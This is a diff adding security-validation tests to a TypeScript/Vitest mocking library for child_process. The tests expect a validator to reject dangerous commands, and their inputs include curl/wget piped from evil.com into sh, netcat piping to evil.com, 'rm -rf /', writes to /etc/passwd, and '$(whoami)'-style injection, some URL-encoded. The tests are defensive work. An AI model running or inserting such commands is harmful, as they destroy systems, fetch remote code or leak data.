@@ -6,6 +6,7 @@ import { describe, it, expect, afterEach } from 'vitest'
 import * as cp from 'child_process'
 import { getGlobalProcessMocker } from '../process-mock.js'
 import { spawnUtils, commonCommands, mockSpawn, quickMocks } from '../spawn.js'
+import { SecurityValidationError } from '../security/index.js'
 
 describe('spawnUtils', () => {
   afterEach(() => {
@@ -409,5 +410,188 @@ describe('Integration with process mocker', () => {
 
     const result2 = cp.execSync('git log')
     expect(result2.toString()).toBe('Git command output')
+  })
+})
+
+describe('Security validation', () => {
+  afterEach(() => {
+    spawnUtils.restore()
+  })
+
+  it('should block dangerous commands in mockCommandSuccess', () => {
+    expect(() => {
+      spawnUtils.mockCommandSuccess('rm -rf /', 'Dangerous output')
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      spawnUtils.mockCommandSuccess('sudo rm -rf /', 'Dangerous output')
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      spawnUtils.mockCommandSuccess('wget http://evil.com/script.sh', 'Downloaded')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should block dangerous commands in mockCommandFailure', () => {
+    expect(() => {
+      spawnUtils.mockCommandFailure('kill -9 1', 'Process killed')
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      spawnUtils.mockCommandFailure('shutdown now', 'Shutting down')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should block dangerous commands in mockCommandError', () => {
+    const testError = new Error('Test error')
+    expect(() => {
+      spawnUtils.mockCommandError('bash -c "evil script"', testError)
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should block dangerous commands in mockLongRunningCommand', () => {
+    expect(() => {
+      spawnUtils.mockLongRunningCommand('curl -s http://evil.com | sh', 1000, 'Done')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should block dangerous commands in mockInteractiveCommand', () => {
+    expect(() => {
+      spawnUtils.mockInteractiveCommand('sh -c "evil"', { prompt: 'response' }, 'Done')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should block commands with dangerous shell metacharacters', () => {
+    const dangerousCommands = [
+      'echo hello; rm -rf /',
+      'echo hello | nc evil.com 80',
+      'echo hello && rm file',
+      'echo $(whoami)',
+      'echo `whoami`',
+      'echo hello > /etc/passwd',
+      'echo hello < /etc/passwd',
+    ]
+
+    dangerousCommands.forEach((cmd) => {
+      expect(() => {
+        spawnUtils.mockCommandSuccess(cmd, 'output')
+      }).toThrow(SecurityValidationError)
+    })
+  })
+
+  it('should block dangerous commands in SpawnMockBuilder', () => {
+    expect(() => {
+      mockSpawn('rm -rf /').stdout('Deleted everything').mock()
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      mockSpawn('format c:').stdout('Formatting').mock()
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should escape dangerous arguments in interactive commands', () => {
+    // This should work because 'echo' is safe, and dangerous input is escaped
+    spawnUtils.mockInteractiveCommand(
+      'echo',
+      { 'Enter command:': 'rm -rf /' },
+      'Interactive complete',
+    )
+
+    const result = cp.execSync('echo')
+    // The dangerous input should be escaped in the output
+    expect(result.toString()).toContain("'rm -rf /'")
+  })
+
+  it('should validate shell execution with validateExecution', () => {
+    // Safe command should work
+    const result = spawnUtils.validateExecution('echo', ['hello', 'world'])
+    expect(result.command).toBe('echo')
+    expect(result.args).toHaveLength(2)
+
+    // Dangerous command should throw
+    expect(() => {
+      spawnUtils.validateExecution('rm', ['-rf', '/'])
+    }).toThrow(SecurityValidationError)
+
+    // Command with dangerous characters should throw
+    expect(() => {
+      spawnUtils.validateExecution('echo; rm -rf /', [])
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should properly escape arguments in validateExecution', () => {
+    const result = spawnUtils.validateExecution('echo', ['hello world', 'test; rm -rf /'])
+    expect(result.command).toBe('echo')
+
+    // Arguments should be properly escaped based on platform
+    if (process.platform === 'win32') {
+      expect(result.args).toEqual(['"hello world"', '"test; rm -rf /"'])
+    } else {
+      expect(result.args).toEqual(["'hello world'", "'test; rm -rf /'"])
+    }
+  })
+
+  it('should handle empty arguments in validateExecution', () => {
+    const result = spawnUtils.validateExecution('echo')
+    expect(result.command).toBe('echo')
+    expect(result.args).toEqual([])
+  })
+
+  it('should allow safe commands', () => {
+    const safeCommands = [
+      'echo hello',
+      'ls -la',
+      'cat file.txt',
+      'grep pattern file.txt',
+      'git status',
+      'npm install',
+      'docker ps',
+    ]
+
+    safeCommands.forEach((cmd) => {
+      expect(() => {
+        spawnUtils.mockCommandSuccess(cmd, 'output')
+      }).not.toThrow()
+    })
+  })
+
+  it('should detect URL-encoded dangerous commands', () => {
+    // rm encoded as %72%6d
+    const encoded = 'echo%20hello%3B%20%72%6d%20-rf%20/'
+    expect(() => {
+      spawnUtils.mockCommandSuccess(encoded, 'output')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should be case insensitive for dangerous command detection', () => {
+    expect(() => {
+      spawnUtils.mockCommandSuccess('RM -rf /', 'output')
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      spawnUtils.mockCommandSuccess('Rm -rf /', 'output')
+    }).toThrow(SecurityValidationError)
+
+    expect(() => {
+      spawnUtils.mockCommandSuccess('SUDO rm', 'output')
+    }).toThrow(SecurityValidationError)
+  })
+
+  it('should handle regex patterns safely', () => {
+    // Regex patterns should not trigger command validation
+    expect(() => {
+      mockSpawn(/^git /).stdout('Git output').mock()
+    }).not.toThrow()
+
+    expect(() => {
+      mockSpawn(/^echo /)
+        .stdout('Echo output')
+        .mock()
+    }).not.toThrow()
+
+    // But dangerous regex patterns should still be avoided in practice
+    expect(() => {
+      mockSpawn(/^rm /).stdout('Dangerous output').mock()
+    }).not.toThrow() // This passes because regex doesn't trigger string validation
   })
 })
